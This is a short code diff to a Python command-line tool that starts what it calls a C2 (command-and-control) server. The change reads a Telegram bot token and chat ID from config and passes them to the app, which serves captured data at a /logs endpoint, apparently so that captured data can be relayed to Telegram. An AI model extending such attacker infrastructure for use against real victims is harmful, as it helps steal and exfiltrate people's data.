@@ -629,12 +629,15 @@ def server(
     import secrets
     from .server.c2 import create_app
     
+    config = load_config()
+    telegram_bot_token = config.get('c2', {}).get('telegram_bot_token')
+    telegram_chat_id = config.get('c2', {}).get('telegram_chat_id')
+    
     # Determine auth key
     final_auth_key = auth_key
     
     if not final_auth_key:
         # Check for existing session
-        config = load_config()
         session_key = config.get('c2', {}).get('auth_key')
         session_name = config.get('c2', {}).get('session_name', '')
         
@@ -674,7 +677,12 @@ def server(
     console.print(f"  [cyan]GET  /logs[/cyan]   - View captured data")
     console.print(f"  [cyan]GET  /health[/cyan] - Health check\n")
     
-    app_instance = create_app(auth_key=final_auth_key, log_file=log_file)
+    app_instance = create_app(
+        auth_key=final_auth_key, 
+        log_file=log_file,
+        telegram_bot_token=telegram_bot_token,
+        telegram_chat_id=telegram_chat_id
+    )
     app_instance.run(host=host, port=port, debug=False)
 
 
